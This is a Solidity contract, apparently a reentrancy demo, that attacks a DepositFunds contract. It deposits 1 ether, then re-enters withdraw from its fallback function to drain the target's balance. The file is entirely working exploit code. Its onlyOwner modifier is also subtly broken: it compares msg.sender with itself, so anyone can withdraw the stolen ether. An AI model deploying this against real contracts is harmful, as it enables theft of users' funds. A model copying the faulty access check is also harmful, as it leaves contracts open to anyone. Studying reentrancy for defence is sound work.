// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "./DepositFunds.sol";

contract Attack {
    DepositFunds public depositFunds;

    address public owner;

    constructor(address _depositFundAddress) {
        depositFunds = DepositFunds(_depositFundAddress);
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == msg.sender, "invalid owner");
        _;
    }

    //cannot use receive fallback here, because if we use this then upon receiving ether, 
    // the receive fallback will always call and no withdraw function of the depositFunds contract will be called.
    // receive() external payable {}

    // Fallback is called when DepositFunds Contract sends Ether to this contract.
    fallback() external payable {
        if (address(depositFunds).balance >= 1 ether) {
            depositFunds.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        depositFunds.deposit{value: 1 ether}();
        depositFunds.withdraw();
    }

    function withdraw(address _owner) external onlyOwner {
        require(_owner != address(0), "Zero Address");
        require(address(this).balance > 0, "Amount not available for withdraw");
        payable(_owner).transfer(address(this).balance);

    }


    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
